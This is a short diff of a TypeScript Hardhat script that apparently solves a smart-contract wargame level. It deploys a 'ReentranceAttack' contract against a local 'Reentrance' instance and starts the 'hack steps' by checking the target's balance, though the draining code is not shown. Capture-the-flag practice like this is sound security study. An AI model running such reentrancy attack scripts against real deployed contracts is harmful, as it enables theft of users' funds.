@@ -2,17 +2,18 @@ import { ethers } from "hardhat";
 import { BigNumber } from "ethers";
 import { TransactionRequest } from "@ethersproject/providers";
 
+//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
 const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
 const CONTRACT_ADDRESS = "0x13F7816057De7256dAF5028EaF8E79775d3a27A3";
 
 async function main() {
 const signer = await ethers.getSigner(PLAYER_ADDRESS);
-
-//Fit contract name and address (current lvl instance)
 const contract = await ethers.getContractAt("Reentrance",CONTRACT_ADDRESS, signer);
 
 const attackerContractFactory = await ethers.getContractFactory("ReentranceAttack", signer);
 const attackerContract = await attackerContractFactory.deploy(contract.address);
+
+//HACK STEPS 
 
 // 1. Check contract balance
 let balance = await ethers.provider.getBalance(contract.address);
